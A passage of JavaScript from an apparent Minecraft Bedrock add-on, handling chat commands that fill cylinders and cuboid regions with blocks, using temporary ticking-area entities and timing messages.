                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "x", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode, tintegrity);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderyz":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "y", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode, tintegrity);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderxz":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "z", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode, tintegrity);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderxyz":
                                system.run(() => { let ta; try {
                                    ;
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(center));
                                    ta = player.dimension.getEntitiesAtBlockLocation(center).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "z", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode, tintegrity);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "hourglass":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "cube":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        if (replacemode) {
                                            clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                        }
                                        ;
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            default:
                        }
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^ifillc$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    srun(() => { try {
                        let startTime = Date.now();
                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                        let endTime = Date.now();
                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^ifilld$/): {
                eventData.cancel = true;
                let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                let firstblockname = reststringaftercoordinates.split(" ")[0];
                let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                let matchingblock = lastblockname == "" ? [] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                srun(() => { try {
                    let startTime = Date.now();
                    let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                    let endTime = Date.now();
                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                } });
                //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
            }
            case !!switchTest.match(/^itfillc$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    system.run(() => { let ta; try {
                        let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                        player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                        ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                        system.runTimeout(() => { try {
                            let startTime = Date.now();
                            let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                            let endTime = Date.now();
                            player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        finally {
                            ta?.remove();
                        } }, 2);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
